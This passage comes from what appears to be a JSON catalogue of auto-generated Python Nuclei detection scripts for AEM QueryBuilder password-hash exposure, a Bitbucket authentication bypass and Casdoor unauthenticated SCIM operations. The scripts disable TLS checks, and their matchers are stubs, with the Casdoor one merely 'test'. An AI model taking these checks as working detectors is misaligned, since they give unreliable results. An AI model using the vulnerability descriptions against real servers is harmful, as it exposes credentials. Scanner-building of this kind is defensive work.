re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"rep:password\", \"success\":true, \"results\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"rep:password\", \"success\":true, \"results\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM QueryBuilder JSON Exposure - Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_querybuilder_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-querybuilder-bypass\nName: AEM QueryBuilder JSON Exposure - Bypass\nSeverity: critical\nDescription: Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_querybuilder_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-querybuilder-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM QueryBuilder JSON Exposure - Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"rep:password\", \"success\":true, \"results\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"rep:password\", \"success\":true, \"results\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM QueryBuilder JSON Exposure - Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_querybuilder_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "aem",
          "adobe",
          "exposure",
          "querybuilder"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_bitbucket_auth_bypass",
        "name": "Bitbucket Server > 4.8 - Authentication Bypass",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data",
        "severity": "critical",
        "detection": "[AND] mot(s) '<h2>Database</h2>, Migrate database' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: bitbucket-auth-bypass\nName: Bitbucket Server > 4.8 - Authentication Bypass\nSeverity: critical\nDescription: There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_bitbucket_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"bitbucket-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Bitbucket Server > 4.8 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<h2>Database</h2>, Migrate database' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<h2>Database</h2>, Migrate database']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Bitbucket Server > 4.8 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_bitbucket_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: bitbucket-auth-bypass\nName: Bitbucket Server > 4.8 - Authentication Bypass\nSeverity: critical\nDescription: There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_bitbucket_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"bitbucket-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Bitbucket Server > 4.8 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<h2>Database</h2>, Migrate database' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<h2>Database</h2>, Migrate database']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Bitbucket Server > 4.8 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_bitbucket_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "atlassian",
          "bitbucket",
          "auth-bypass",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_casdoor_unauth_operations",
        "name": "Casdoor <=v1.811.0 - Unauthenticated SCIM Operations",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",\"Resources\", \"emails\"); contains(header,\"casdoor_session_id\") && status_code == 200 / [OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",username); status_code == 201 / [OR] DSL: contains_all(body,\"\\\"status\\\": \\\"ok\\\"\",\"data\",\"msg\",\"sub\"); status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{randstr}}"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{randstr_1}}"
          },
          {
            "name": "email",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: email",
            "default": "{{username}}@oast.fun"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: casdoor-unauth-operations\nName: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\nSeverity: critical\nDescription: Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_casdoor_unauth_operations:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"casdoor-unauth-operations\"\n    SEVERITY = \"critical\"\n    NAME = \"Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",\"Resources\", \"emails\"); contains(header,\"casdoor_session_id\") && status_code == 200 / [OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",username); status_code == 201 / [OR] DSL: contains_all(body,\"\\\\\"status\\\\\": \\\\\"ok\\\\\"\",\"data\",\"msg\",\"sub\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_casdoor_unauth_operations(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: casdoor-unauth-operations\nName: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\nSeverity: critical\nDescription: Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_casdoor_unauth_operations:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"casdoor-unauth-operations\"\n    SEVERITY = \"critical\"\n    NAME = \"Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = 